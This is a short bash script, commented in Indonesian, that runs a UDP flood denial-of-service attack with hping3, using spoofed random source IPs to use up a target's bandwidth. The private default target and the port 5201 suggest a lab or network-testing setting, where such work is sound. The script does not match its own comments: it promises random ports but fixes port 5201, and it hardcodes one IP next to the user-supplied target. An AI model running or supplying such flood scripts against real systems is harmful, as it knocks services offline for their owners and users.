#!/bin/bash
# Serangan UDP Flood menggunakan hping3
# Script ini mengirim UDP flood dengan source IP random ke port random untuk konsumsi bandwidth
# 
# Penggunaan:
#   sudo ./attack_udp.sh [TARGET_IP]
#   
# Jika TARGET_IP tidak diberikan, default adalah 192.168.18.20
# Tekan Ctrl+C untuk berhenti

# Default target IP
TARGET_IP="${1:-192.168.18.20}"

echo "=========================================="
echo "   UDP FLOOD ATTACK"
echo "=========================================="
echo "Target: $TARGET_IP"
echo "Mode: UDP flood dengan random source IP dan random destination port"
echo "Tujuan: Konsumsi bandwidth"
echo ""
echo "Tekan Ctrl+C untuk menghentikan serangan"
echo "=========================================="
echo ""

# Cek apakah hping3 terinstal
if ! command -v hping3 &> /dev/null; then
    echo "ERROR: hping3 tidak terinstal!"
    echo "Install dengan: sudo apt install hping3"
    exit 1
fi

# Cek apakah script dijalankan dengan sudo
if [ "$EUID" -ne 0 ]; then
    echo "ERROR: Script ini harus dijalankan dengan sudo"
    echo "Gunakan: sudo ./attack_udp.sh"
    exit 1
fi

# Jalankan serangan
echo "Memulai UDP flood..."
hping3 --udp --flood --rand-source -p 5201 192.168.18.20 "$TARGET_IP"
